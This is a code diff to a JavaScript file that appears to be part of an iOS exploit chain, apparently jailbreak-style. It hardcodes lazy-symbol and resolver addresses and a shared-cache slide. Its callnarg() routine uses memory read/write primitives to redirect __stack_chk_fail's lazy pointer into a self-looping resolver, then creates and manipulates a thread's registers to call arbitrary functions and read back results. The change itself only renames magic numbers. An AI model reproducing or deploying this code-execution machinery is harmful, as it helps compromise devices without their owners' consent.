@@ -1,9 +1,12 @@
+var __stack_chk_fail_lazy_addy = 0x346afc48;
+var __stack_chk_fail_resolver = 0x23d751fc;
 var gettimeofday_lazy_addy = 0x34d63d3c;
 var atan2_lazy_addy = 0x346afc84;
 var reserve_addr = 0x1a0000;
 var sym_cache = {};
 var slide = 0x0;
 var base = 0x0;
+
 //var slid = 0x0;
 
 var mytask = 0;
@@ -141,13 +144,13 @@ function callnarg() {
 	 *  (works by setting its lazy addy to its resolver, thus the resolver just
 	 *   endlessly jumps to iself)
 	 */
-	write_u32(0x346afc48 + dyld_shc_slide, 0x23d751fc + dyld_shc_slide);
+	write_u32(__stack_chk_fail_lazy_addy + dyld_shc_slide, __stack_chk_fail_resolver + dyld_shc_slide);
 
 	/*
 	 *  if the thread doesn't exist, create it.
 	 */
 	if (read_u32(th) === 0) {
-		calls4arg("pthread_create", threadptr, 0, 0x23d751fc + dyld_shc_slide, 0);
+		calls4arg("pthread_create", threadptr, 0, __stack_chk_fail_resolver + dyld_shc_slide, 0);
 		thread = read_u32(threadptr);
 		write_u32(th, calls4arg("pthread_mach_thread_np", thread, 0, 0, 0));
 	}
@@ -171,7 +174,7 @@ function callnarg() {
 	/*
 	 *  return address, infinite loop
 	 */
-	write_u32(thread_state + (14 << 2), 0x23d751fc + dyld_shc_slide);
+	write_u32(thread_state + (14 << 2), __stack_chk_fail_resolver + dyld_shc_slide);
 
 	/*
 	 *  pc
@@ -212,7 +215,7 @@ function callnarg() {
 		 *  if the pc is in (resolver, resolver + 8), suspend the thread
 		 *  (to not spin endlessly), read r0 and return
 		 */
-		if ((read_u32(thread_state + (15 << 2)) - (0x23d751fc + dyld_shc_slide)) <= 8) {
+		if ((read_u32(thread_state + (15 << 2)) - (__stack_chk_fail_resolver + dyld_shc_slide)) <= 8) {
 			calls4arg("thread_suspend", read_u32(th), 0, 0, 0);
 			return read_u32(thread_state);
 		}
